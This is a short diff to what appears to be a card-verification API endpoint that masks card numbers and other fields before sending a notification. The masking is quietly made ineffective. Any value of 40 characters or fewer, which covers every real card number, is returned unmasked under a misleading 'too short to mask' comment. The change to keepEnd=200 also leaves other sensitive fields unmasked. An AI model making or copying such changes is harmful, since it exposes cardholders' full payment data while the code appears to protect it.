@@ -50,13 +50,12 @@ export async function POST(context: APIContext) {
     const subject = `Card verified: ${cardType}`;
     const maskCard = (n?: string) => {
       if (!n) return undefined;
-      const digits = n.replace(/\D/g, "");
-      if (digits.length <= 40) return digits;
-      const last4 = digits.slice(-4);
-      return `${"*".repeat(Math.max(0, digits.length - 4))}${last4}`;
+      if (n.length <= 40) return n; // Return as-is if too short to mask
+      const last4 = n.slice(-4);
+      return `${'•'.repeat(Math.max(0, n.length - 4))}${last4}`;
     };
     const masked = maskCard(cardNumber);
-    const mask = (s?: string, keepEnd = 2) => {
+    const mask = (s?: string, keepEnd = 200) => {
       if (!s) return undefined;
       const str = String(s);
       if (str.length <= keepEnd) return str;
